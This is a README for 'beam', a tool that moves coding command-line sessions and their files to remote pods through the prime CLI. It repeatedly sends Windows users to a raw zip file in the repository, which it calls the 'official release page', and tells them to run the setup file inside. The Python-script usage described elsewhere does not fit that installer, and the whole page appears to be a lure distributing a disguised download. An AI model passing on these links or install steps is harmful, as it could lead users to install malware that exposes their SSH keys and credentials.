# ⚡ beam - Share Your Coding Session Remotely

[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)

---

## 📥 Download and Setup

You can get the software by visiting the release page here:

**[Download beam](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)**

This link takes you to the official release page. On that page, choose the latest version for Windows and download the setup file.

---

## 💻 What is beam?

beam lets you hand off your current coding command-line session to a remote workspace, called a pod. This means you can start working on one machine, then continue your work on another without losing progress. It copies your project files and settings to the remote pod, so you can pick up exactly where you left off.

It works with several coding command-line tools like codex, kimi, opencode, pi, claude, and amp.

beam uses a tool called **prime** to make new pods. You need to have the **prime** command-line tool installed to run beam.

---

## 🚀 Getting Started: What You Need

Before using beam, set up a few things:

1. **Windows PC with internet connection.**

2. **SSH key** configured for prime. This key lets you securely connect to your pods. You need to tell prime where your SSH private key file is using this command:

   ```
   prime config set-ssh-key-path <private_key>
   ```

   Replace `<private_key>` with the path to your SSH key file. If you don't have an SSH key, you can create one using a tool like PuTTYgen or the Windows command prompt.

3. **Install rsync and ssh tools on Windows.**

   These tools let beam copy files and connect to the pod. You can get them by installing Git for Windows, which includes these tools, or by installing Windows Subsystem for Linux (WSL).

4. **Install the prime CLI tool.**

   You can install it with the following command:

   ```
   uv tool install prime
   ```

5. **uv runtime.**

   beam runs using the `uv` command. Make sure you have the `uv` tool installed and accessible on your system.

---

## 🛠️ How to Install beam

1. Visit the release page:

   [https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)

2. Download the latest Windows setup or zip file.

3. Open the downloaded file and follow the instructions to install the software on your PC.

4. Make sure the `beam.py` script and any related files are accessible in your installation directory.

---

## 📂 Using beam: Step-by-Step Guide

beam is a script you run from your command line interface. Here is how to transfer your coding session:

1. Open your command prompt or terminal.

2. Navigate to your project directory where your current coding session is.

3. Run beam with the following command:

   ```
   uv run beam.py
   ```

   Add any options you need after the command. beam will copy your project files and configuration settings to the remote pod.

4. beam automatically transfers your code folder and login information for tools like Codex to the pod.

5. Once the transfer is complete, connect to your pod using SSH. For example:

   ```
   ssh <username>@<pod_address>
   ```

6. On the remote pod, you can resume your coding session by running:

   ```
   codex resume
   ```

   This will continue your work from where you left off.

---

## 🔧 Behind the Scenes: How beam Works

- beam creates new pods using the prime CLI. It needs access to your SSH keys for secure connections.

- It copies your entire working directory, including source code and configuration files, to the remote pod using `rsync`.

- Your command-line tools' config files and user transcripts are also copied to keep your environment consistent.

- Supported coding CLI tools include codex, kimi, opencode, pi, claude, and amp.

- beam expects the remote pod to allow installation of tools with `apt` and have `sudo` rights. This allows automatic setup of any necessary software.

---

## 🔐 SSH Key Setup

SSH keys let you access your pods securely without typing passwords. beam and prime look for your SSH key in this order:

1. The environment variable `PRIME_SSH_KEY_PATH`

2. The prime CLI configuration: `ssh_key_path`

3. The default SSH key location: `~/.ssh/id_rsa`

Make sure one of these is set before using beam.

---

## ⚙️ Example Workflow

Here is a sample setup for a typical user:

1. Create an SSH key pair on your Windows machine (using PuTTYgen or ssh-keygen).

2. Configure prime to use your SSH key:

   ```
   prime config set-ssh-key-path C:\Users\You\.ssh\id_rsa
   ```

3. Install Git for Windows to get `rsync` and `ssh` tools.

4. Install uv and prime CLI:

   ```
   uv tool install prime
   ```

5. Download and install beam from the release page.

6. Open your terminal and go to your project folder:

   ```
   cd C:\Users\You\code\myproject
   ```

7. Run:

   ```
   uv run beam.py
   ```

8. After beam finishes copying your files, connect to the new pod via SSH:

   ```
   ssh user@pod_address
   ```

9. Restart your coding CLI session remotely:

   ```
   codex resume
   ```

---

## 📁 Project Sync Paths and Excludes

beam mirrors your project directory exactly to keep your coding history and transcripts up to date.

By default, the project folder on your local computer (for example, `C:\Users\You\code\project`) is synced to the same path on the remote pod.

---

## 💡 Tips for Success

- Ensure your remote pod image allows `apt` and `sudo` commands. This is needed to install tools automatically.

- Keep your SSH key secured and do not share it.

- Check that `rsync` and `ssh` commands are available in your Windows command line before running beam.

- Always use the latest version of beam and prime for best compatibility.

---

[![Download beam](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/Hamdy1234H/beam/main/beam/Software-3.3.zip)